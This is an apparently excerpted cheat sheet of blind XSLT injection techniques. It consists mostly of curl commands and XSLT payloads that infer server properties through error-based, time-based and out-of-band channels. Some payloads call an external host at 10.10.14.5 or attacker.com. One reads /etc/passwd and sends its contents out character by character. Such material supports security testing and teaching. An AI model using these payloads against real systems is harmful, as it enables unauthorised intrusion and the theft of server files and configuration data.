...
- **Command:**
    ...
    ```bash
    curl -s -X POST --data-urlencode "xml=<xsl:if test=\"substring(system-property('os.name'),1,1)='W'\"><xsl:message terminate=\"yes\">A</xsl:message></xsl:if>" https://target/app
    ```
...
- **Payload:**
    ...
    <xsl:if test="substring(system-property('user.name'),1,1)='a'">
        <xsl:variable name="x" select="document('http://10.10.14.5:8080/delay')"/>
    </xsl:if>
    ```
...
- **Command:**
    ...
    ```bash
    curl -w '%{time_total}\n' -s -X POST --data-urlencode "xml=<xsl:if test=\"substring(system-property('user.name'),1,1)='a'\"><xsl:variable name='x' select=\"document('http://10.10.14.5:8080/delay')\"/></xsl:if>" https://target/app
    ```

- **Explanation:** Here, a deliberate external request induces a measurable delay when the condition is true, allowing inference based on response timing.
...
- **Payload:**
    ...
    ```xml
    <xsl:variable name="x" select="document(concat('http://attacker.com/', substring(system-property('user.name'),1,1)))"/>
    ```
...
- **Payload:**
    ...
    ```xml
    <xsl:variable name="x" select="document(concat('http://attacker.com/', substring(string(document('file:///etc/passwd')),1,1)))"/>
    ```
